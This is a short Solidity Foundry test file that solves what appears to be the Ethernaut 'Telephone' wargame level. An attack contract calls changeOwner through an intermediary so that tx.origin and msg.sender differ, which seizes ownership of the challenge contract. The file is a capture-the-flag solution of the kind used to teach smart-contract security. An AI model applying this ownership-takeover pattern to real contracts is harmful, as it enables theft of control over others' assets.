// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract TelephoneAttack {
  ITelephone internal challenge;

  constructor(address _challengeAddress) {
    challenge = ITelephone(_challengeAddress);
  }

  function attack() public {
    challenge.changeOwner(msg.sender);
  }
}

contract TelephoneTest is Test {
  address internal challengeAddress;
  TelephoneAttack internal attackContract;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x9D8e38b52F08FD7b0fc5C04460CdFC3AC30ce7bf);
    attackContract = new TelephoneAttack(challengeAddress);
  }

  function testExploit() public {
    attackContract.attack();
    utils.submitLevelInstance(challengeAddress);
  }
}
